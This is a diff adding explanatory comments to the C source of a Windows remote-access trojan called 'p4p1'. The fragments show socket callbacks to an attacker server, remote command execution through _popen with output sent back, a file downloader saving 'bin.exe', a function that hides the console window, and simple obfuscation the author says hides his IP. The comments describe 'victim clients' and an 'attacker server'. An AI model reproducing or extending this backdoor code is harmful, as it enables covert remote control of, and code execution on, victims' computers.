@@ -226,23 +226,31 @@ void connected(fileWrapper * file, int * cn)
 	} while( *cn == SOCKET_ERROR);
 }
 
+/*
+ * function for the built in commands
+ */
 int processdata(SOCKET s, char cmd, char cmd2)
 {
 	char buf[BUFSIZE] = "";
 	int bytesSent = 0;
 	int bytesRecv = 0;
 
+	// those pointers are used to make the syntax more convinient
+	// I should just name the above ints to the pointer names to use less
+	// memory but when i found it i was so happy that since then
+	// i keep it because it reminds me the time where i didnt know what where
+	// pointers for xD
 	int * pbs = &bytesSent;
 	int * pbr = &bytesRecv;
 
 	if(iscommand(cmd) == 1 || iscommand(cmd) == 2 || iscommand(cmd) == 3){
 
-		if(iscommand(cmd) == 3 && iscommand(cmd2) == 4){
+		if(iscommand(cmd) == 3 && iscommand(cmd2) == 4){	// the cd command
 
 			memset(buf, 0, BUFSIZE);
 			strcpy(buf, "#!cd >");
 
-			*pbs = send(s, buf, BUFSIZE, 0);
+			*pbs = send(s, buf, BUFSIZE, 0);		/* This part sends the prompt */
 			if(*pbs == SOCKET_ERROR) {
 				if(WSAGetLastError() != WSAECONNREFUSED
 				|| WSAGetLastError() == WSAECONNRESET){
@@ -263,13 +271,13 @@ int processdata(SOCKET s, char cmd, char cmd2)
 				if(*pbr < 0){
 					return -1;
 				} else {
-					int q = 0;
+					int q = 0;		// removes the new line from buffer
 					while(buf[q] != '\n'){
 						q++;
 					}
 					buf[q] = '\0';
 					buf[q+1] = 0;
-					change_dir(buf);
+					change_dir(buf);		// <- actual chaging directory magic
 					memset(buf, 0, BUFSIZE);
 					strcpy(buf, "[*] changed dir\n");
 				}
@@ -307,7 +315,7 @@ int processdata(SOCKET s, char cmd, char cmd2)
 				if(*pbr < 0){
 					return -1;
 				} else {
-					download(buf);
+					download(buf);		// <- downloading magic ;)
 					memset(buf, 0, BUFSIZE);
 					strcpy(buf, "[*] file downloaded\n");
 				}
@@ -342,7 +350,7 @@ int processdata(SOCKET s, char cmd, char cmd2)
 int iscommand(char buf)
 {
 	if(buf == '*') {
-		return 1;
+		return 1;			/* All of the special chars are listed here */
 	} else if(buf == '&') {
 		return 2;
 	} else if(buf == 'c') {
@@ -354,6 +362,9 @@ int iscommand(char buf)
 	}
 }
 
+/*
+ *	a stupid wrapper for chdir
+ */
 void change_dir(char * dir)
 {
 	chdir(dir);
@@ -361,7 +372,6 @@ void change_dir(char * dir)
 
 /*Downloader func
  */
-
 int download(char * url)
 {
 	char path[100] = "bin.exe";
@@ -425,6 +435,12 @@ int sendui(int s, char uin, int * bs)
 		}
 	}
 
+	// if you send a client id of 1 p4p1 will go in a special vpn mode with a vpn header
+	// so that the user knows it is in vpn mode it was an old option that i droped bevause it was
+	// verry buggy, the vpn was an additional program that accepted a client with a fiew modes
+	//	-- 1 client 2 server  [victim clients, vpn server/client, attacker server]
+	//	-- 2 client 1 server [victim client, vpn server, attaceker client with special id]
+	// the second mode was the buggy one
 	if(uin == '1'){
 		pbs = send(s, uivpn, sizeof(uivpn), 0);
                 if(pbs == SOCKET_ERROR) { //server disconnected!
@@ -441,6 +457,11 @@ int sendui(int s, char uin, int * bs)
 	return 0;
 }
 
+/*
+ * This will hide the console from poping up
+ * it was an ancient bug that you can still find on V1 to V5 i think
+ * when a command was typed in the propt would pop up for 1/2 a second
+ */
 void stealth()
 {
 	HWND stealth;
@@ -493,6 +514,10 @@ int sendprompt(SOCKET s, char uin)
 	return 0;
 }
 
+/*
+ * This part will execute the commands into the windows dos shell terminal thing
+ * its just a pipe with read to send back the output
+ */
 int executeCommand(fileWrapper * file)
 {
 	if( (file->pPipe = _popen( file->buf, "r" )) == NULL ){
@@ -522,7 +547,7 @@ int executeCommand(fileWrapper * file)
 }
 
 /*
- *Verry simple crypo to hide some stuff
+ *Verry simple crypo to hide some stuff liek my ip :P
  **/
 char incr(char ch)
 {
